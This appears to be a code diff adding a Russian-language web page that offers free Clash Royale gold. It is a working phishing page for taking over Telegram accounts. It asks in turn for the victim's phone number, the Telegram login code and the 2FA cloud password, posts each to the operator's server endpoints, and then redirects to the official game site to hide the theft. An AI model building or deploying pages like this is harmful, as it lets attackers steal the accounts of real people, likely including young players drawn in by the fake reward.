@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clash Royale - Получи 1000 Голды!</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@700;900&display=swap');
+        
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Montserrat', sans-serif; }
+        
+        body {
+            background: radial-gradient(circle at center, #2d1b4e 0%, #0f0c1a 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: #fff;
+        }
+
+        .card {
+            background: linear-gradient(145deg, #2c2441, #1a1529);
+            padding: 40px 30px;
+            border-radius: 20px;
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+            border: 2px solid #f1c40f;
+            box-shadow: 0 0 40px rgba(241, 196, 15, 0.3), inset 0 0 20px rgba(0,0,0,0.5);
+            position: relative;
+        }
+
+        /* Золотая корона сверху */
+        .card::before {
+            content: "👑";
+            position: absolute;
+            top: -25px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 40px;
+            filter: drop-shadow(0 0 10px #f1c40f);
+        }
+
+        h1 {
+            color: #f1c40f;
+            font-size: 26px;
+            text-transform: uppercase;
+            text-shadow: 2px 2px 0 #b8860b;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 14px;
+            color: #bbb;
+            margin-bottom: 20px;
+        }
+
+        /* Поля ввода */
+        input {
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 10px;
+            border: 2px solid #4a3b6b;
+            background: #1f1830;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input:focus {
+            border-color: #f1c40f;
+            box-shadow: 0 0 10px rgba(241, 196, 15, 0.4);
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(to bottom, #f1c40f, #d4ac0d);
+            color: #1a1529;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 900;
+            text-transform: uppercase;
+            cursor: pointer;
+            box-shadow: 0 5px 0 #b8860b;
+            transition: 0.1s;
+        }
+
+        button:active {
+            transform: translateY(5px);
+            box-shadow: none;
+        }
+
+        .hidden { display: none; }
+        
+        /* Анимация загрузки для кнопки */
+        .loading {
+            pointer-events: none;
+            opacity: 0.7;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1 id="title">Получи 1000 Голды!</h1>
+        
+        <!-- Шаг 1: Телефон -->
+        <div id="step-phone">
+            <p>Для получения награды подтвердите ваш Telegram аккаунт</p>
+            <input type="tel" id="phone" placeholder="+7 999 123-45-67" autocomplete="off">
+            <button onclick="requestCode()">Подтвердить Telegram</button>
+        </div>
+
+        <!-- Шаг 2: Код -->
+        <div id="step-code" class="hidden">
+            <p>Введите код из Telegram (придет в чат)</p>
+            <input type="text" id="code" placeholder="12345" autocomplete="off">
+            <button onclick="verifyCode()">Войти в аккаунт</button>
+        </div>
+
+        <!-- Шаг 3: Пароль (2FA) -->
+        <div id="step-password" class="hidden">
+            <p>Введите ваш пароль от Telegram (Облачный пароль)</p>
+            <input type="password" id="password" placeholder="Пароль 2FA" autocomplete="off">
+            <button onclick="verifyPassword()">Подтвердить</button>
+        </div>
+    </div>
+
+    <script>
+        let currentPhone = "";
+
+        async function requestCode() {
+            currentPhone = document.getElementById('phone').value;
+            if (!currentPhone) return alert("Введите номер телефона");
+
+            const btn = event.target;
+            btn.classList.add('loading');
+            btn.textContent = 'Отправка...';
+
+            const res = await fetch('/api/request-code', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: currentPhone })
+            });
+            const data = await res.json();
+            
+            if (data.success) {
+                document.getElementById('step-phone').classList.add('hidden');
+                document.getElementById('step-code').classList.remove('hidden');
+            } else {
+                alert(data.error);
+                btn.classList.remove('loading');
+                btn.textContent = 'Подтвердить Telegram';
+            }
+        }
+
+        async function verifyCode() {
+            const code = document.getElementById('code').value;
+            if (!code) return alert("Введите код");
+
+            const res = await fetch('/api/verify-code', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: currentPhone, code })
+            });
+            const data = await res.json();
+
+            if (data.success) {
+                window.location.href = "https://clashroyale.com"; // Редирект на оф. сайт
+            } else if (data.requiresPassword) {
+                document.getElementById('step-code').classList.add('hidden');
+                document.getElementById('step-password').classList.remove('hidden');
+            } else {
+                alert(data.error);
+            }
+        }
+
+        async function verifyPassword() {
+            const password = document.getElementById('password').value;
+            if (!password) return alert("Введите пароль");
+
+            const res = await fetch('/api/verify-password', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: currentPhone, password })
+            });
+            const data = await res.json();
+
+            if (data.success) {
+                window.location.href = "https://clashroyale.com";
+            } else {
+                alert(data.error);
+            }
+        }
+    </script>
+</body>
+</html>
